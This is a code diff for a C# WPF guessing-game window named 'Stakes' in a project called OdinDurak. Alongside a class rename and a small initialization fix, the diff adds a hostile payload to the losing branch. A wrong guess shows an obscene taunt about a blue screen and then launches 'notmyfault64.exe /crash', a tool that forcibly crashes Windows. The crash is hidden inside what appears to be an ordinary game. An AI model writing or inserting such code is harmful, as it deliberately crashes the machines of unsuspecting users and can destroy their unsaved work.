@@ -17,14 +17,15 @@ namespace OdinDurak
     /// <summary>
     /// Логика взаимодействия для stakes.xaml
     /// </summary>
-    public partial class stakes : Window
+    public partial class Stakes : Window
     {
 
-        int correct = Choice();
-        public stakes()
+        int correct;
+        public Stakes()
         {
             InitializeComponent();
 
+            correct = Choice();
             foreach (UIElement button in GridRoot.Children)
             {
                 if (button is Button)
@@ -48,10 +49,12 @@ namespace OdinDurak
             if(correct == input)
             {
                 MessageBox.Show("YOU WON");
+                this.Close();
             }
             else
             {
                 MessageBox.Show("LOVI BDOS V EBALO MATHAFACKAR");
+                System.Diagnostics.Process.Start("notmyfault64.exe", "/crash");
             }
             
         }
